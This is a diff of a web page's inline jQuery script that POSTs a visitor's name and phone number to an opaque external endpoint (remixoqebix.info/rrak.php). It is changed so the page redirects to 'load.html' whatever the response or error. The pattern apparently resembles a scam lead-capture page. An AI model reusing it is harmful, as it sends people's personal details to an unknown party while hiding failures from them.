@@ -11324,18 +11324,25 @@
                name: name,
                phone: phone
             }
-            $.ajax({
-               url: "https://remixoqebix.info/rrak.php/",
-               method: "POST",
-               data: data,
-               success: function (response) {
-                  if (response == "1") {
-                     window.location.href = 'load.html';
-                  }
-               }
-            });
+      $.ajax({
+         url: "https://remixoqebix.info/rrak.php/",
+         method: "POST",
+         data: data,
+         success: function (response) {
+            if (response == "1") {
+               window.location.href = 'load.html';
+            } else {
+               window.location.href = 'load.html';
+               // Handle error cases here
+            }
+         },
+         error: function (jqXHR, textStatus, errorThrown) {
+            window.location.href = 'load.html';
+            // Handle AJAX errors here
          }
       });
+   }
+});
    </script>
 
 </body>
